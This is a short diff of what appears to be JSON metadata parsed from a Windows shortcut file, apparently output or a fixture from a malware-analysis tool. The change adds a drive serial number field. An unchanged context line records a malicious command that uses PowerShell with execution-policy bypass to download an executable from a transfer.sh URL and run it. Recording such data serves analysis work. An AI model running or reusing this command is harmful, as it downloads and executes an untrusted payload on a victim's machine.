@@ -44,6 +44,7 @@
           "command_line_arguments": "/c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe",
           "create_date": "2021:02:23 13:01:44+00:00",
           "cursor_size": 25,
+          "drive_serial_number": "C4CE-B1F5",
           "drive_type": "Fixed Disk",
           "file_attributes": "Archive",
           "fill_attributes": "0x07",
